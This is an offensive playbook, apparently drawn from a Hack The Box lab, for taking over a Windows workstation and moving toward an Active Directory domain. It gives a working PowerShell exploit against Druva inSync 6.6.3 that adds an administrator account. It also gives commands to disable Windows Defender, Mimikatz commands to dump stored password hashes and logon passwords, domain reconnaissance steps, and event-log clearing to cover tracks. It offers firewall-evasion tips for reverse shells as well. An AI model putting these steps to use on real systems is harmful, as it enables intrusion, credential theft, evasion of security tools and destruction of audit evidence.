# Playbook: From Web Foothold to Domain Recon (WS01 Case Study)

**Target:** Windows Workstation (Druva inSync v6.6.3)

**Objective:** Gain SYSTEM privileges and harvest credentials for Domain Pivot.

### Phase 1: Initial Foothold (Web Vector)

- **Identify Entry Point:** Vulnerable web application (e.g., Drupal, XAMPP-hosted site).
- **Upload Web Shell:** Upload a simple PHP/ASPX shell to verify RCE.
- **Trigger Reverse Shell:** Execute a PowerShell one-liner or a staged executable.
  - *Tip:* Use Port 443 or 80 to bypass basic outbound firewall rules.

### Phase 2: Local Privilege Escalation (Druva inSync)

The Druva inSync client (v6.6.3 and below) listens on **TCP 6064** and executes commands as `SYSTEM` without authentication for local requests.

- **Check Service:** `netstat -ano | findstr 6064`
- **Execute Exploit:** Use the following PowerShell script to hijack the RPC call.

```
$ErrorActionPreference = "Stop"

# Command to execute as SYSTEM (e.g., add user or trigger rev shell)
$cmd = "net user jonny Password123! /add && net localgroup administrators jonny /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

# RPC Handshake & Payload
$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$cmdLen = [BitConverter]::GetBytes($cmd.Length)
$payload = $header + $rpcType + $cmdLen + [System.Text.Encoding]::UTF8.GetBytes($cmd)

$s.Send($payload)
$s.Close()
```

### Phase 3: Post-Exploitation & Credential Harvesting

Once you have an Administrative shell (via your new user or a SYSTEM shell), you must blind the antivirus.

#### 1. Disable Windows Defender

```
Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true
```

#### 2. Mimikatz Execution

Transfer `mimikatz.exe` (obfuscated or via memory injection) and dump the memory:

```
# Gain Debug Privileges
privilege::debug

# Dump SAM (Local Hashes)
lsadump::sam

# Dump LSA Secrets (Cached service accounts/GPP)
lsadump::secrets

# Dump Logon Passwords (WDigest/Cleartext if enabled)
sekurlsa::logonpasswords
```

### Phase 4: Domain Recon (The Pivot)

Look for indicators of Active Directory membership:

- **Check Domain:** `systeminfo | findstr /B /C:"Domain"`
- **List Domain Admins:** `net group "Domain Admins" /domain`
- **Check SPNs:** `setspn -T dante.htb -Q */*` (Look for SQL01 or DC01 service accounts).

### Phase 5: Clean-up

- Remove created users: `net user jonny /delete`
- Re-enable Defender: `Set-MpPreference -DisableRealtimeMonitoring $false`
- Clear event logs: `wevtutil cl System` & `wevtutil cl Security`

**Lesson Learned:** Web-based foothold is only the start. Local service misconfigurations (RPC, insecure paths) are the fastest way to SYSTEM on Windows workstations.